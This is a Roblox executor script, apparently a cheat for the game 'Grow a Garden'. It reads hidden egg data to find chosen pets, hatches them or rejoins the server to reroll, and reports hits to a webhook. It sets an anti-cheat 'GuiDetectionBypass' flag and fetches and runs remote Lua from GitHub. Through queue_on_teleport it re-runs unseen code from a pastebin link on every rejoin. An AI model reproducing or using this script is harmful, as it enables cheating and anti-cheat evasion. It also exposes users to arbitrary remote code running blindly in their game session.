if not game:IsLoaded() then game.Loaded:Wait() end
loadstring(game:HttpGet("https://raw.githubusercontent.com/uzu01/arise/refs/heads/main/global.lua"))()

_G.JxereasExistingHooks  = {GuiDetectionBypass  = true}

local notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
local replicated_storage = game:GetService("ReplicatedStorage")
local data_service = require(replicated_storage.Modules.DataService)
local garden

local petImages = {
    ["Queen Bee"] = "https://static.wikia.nocookie.net/growagarden/images/7/7a/Queen_bee.png",
    ["Dragonfly"] = "https://static.wikia.nocookie.net/growagarden/images/c/c9/DragonflyIcon.png",
    ["Disco Bee"] = "https://static.wikia.nocookie.net/growagarden/images/5/56/Bee.png",
    ["Raccoon"] = "https://static.wikia.nocookie.net/growagarden/images/5/54/Raccon_Better_Quality.png"
}

function send_webhook(url, petName, weight, pingUser)
    local imageUrl = petImages[petName]
    local embed = {
        title = petName,
        color = 0xffc800,
        description = "**Weight:** " .. tostring(weight or "Unknown"),
        thumbnail = {
            url = imageUrl or "https://cdn-icons-png.flaticon.com/512/616/616408.png"
        }
    }

    local payload = {
        content = pingUser or "",
        embeds = { embed }
    }

    request({
        Url = url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(payload)
    })
end

task.wait(3)

for i, v in workspace.Farm:GetChildren() do
    if v.Important.Data.Owner.Value ~= player.Name then continue end
    garden = v
end

function get_egg(uid)
    for i, v in garden.Important.Objects_Physical:GetChildren() do
        if v.Name:match("PetEgg") and v:GetAttribute("OBJECT_UUID") == uid then
            return v
        end
    end
    return nil
end

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function normalizeName(s)
    return trim(tostring(s)):lower()
end

local normalizedTargets = {}
for _, name in ipairs(getgenv().target_pets or {}) do
    normalizedTargets[normalizeName(name)] = true
end

local foundTargetPet = false

for i, v in data_service:GetData().SavedObjects do
    local data = v.Data
    local egg = data and data.EggName

    if not egg then continue end
    if not data.RandomPetData then continue end

    local petName = data.Type
    local normalizedPetName = normalizeName(petName)

    if not normalizedTargets[normalizedPetName] then
        continue
    end

    foundTargetPet = true

    if getgenv().webhook_url then
        local pingUser = getgenv().pingUser or ""
        send_webhook(getgenv().webhook_url, petName, data.RandomPetData.Weight, pingUser)
    end

    local eggToHatch = get_egg(i)
    if eggToHatch then
        replicated_storage.GameEvents.PetEggService:FireServer("HatchPet", eggToHatch)
        task.wait(10)
        game:GetService("TeleportService"):Teleport(game.PlaceId)
        break
    end
end

if not foundTargetPet then
    game:GetService("TeleportService"):Teleport(game.PlaceId)
end

queue_on_teleport('loadstring(game:HttpGet("https://pastebin.com/raw/BE36f3z8"))()')
